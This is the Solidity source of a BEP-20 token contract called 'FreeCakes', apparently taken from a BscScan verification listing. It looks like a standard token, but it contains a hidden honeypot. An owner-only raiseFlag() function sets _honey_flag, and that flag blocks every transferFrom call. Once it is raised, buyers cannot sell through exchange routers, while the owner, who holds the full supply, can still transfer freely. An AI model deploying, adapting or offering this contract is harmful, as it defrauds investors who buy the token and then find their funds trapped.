/**
 *Submitted for verification at BscScan.com on 2021-07-28
*/

pragma solidity 0.8.5;

// SPDX-License-Identifier: 0BSD;

contract FreeCakes {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    string private _name;
    string private _symbol;
    
    uint8 private _decimals;
    uint256 private _supply;
    
    address private _owner;
    bool private _honey_flag = false;
    
    constructor() {
        _name = "FreeCakes";
        _symbol = "FreeCakes";
        _decimals = 18;
        _supply = 10_000_000 * (10 ** _decimals);
        _owner = msg.sender;
        
        _balances[_owner] = _supply;
        emit Transfer(address(0x0), _owner, _supply);
    }
    
    function raiseFlag() external returns(bool) {
        require(msg.sender == _owner);
        _honey_flag = true;
        return true;
    }
    
    function totalSupply() external view returns(uint256) {
        return _supply;
    }
    
    function decimals() external view returns(uint8) {
        return _decimals;
    }
    
    function name() external view returns(string memory) {
        return _name;
    }
    
    function symbol() external view returns(string memory) {
        return _symbol;
    }
    
    function balanceOf(address wallet) public view returns(uint256) {
        return _balances[wallet];
    }
    
    function transfer(address to, uint256 amount) public returns(bool) {
        _balances[msg.sender] -= amount;
        _balances[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns(bool) {
        require(!_honey_flag);
        _allowances[from][msg.sender] -= amount;
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    
    function allowance(address owner, address spender) external view returns(uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) external returns(bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}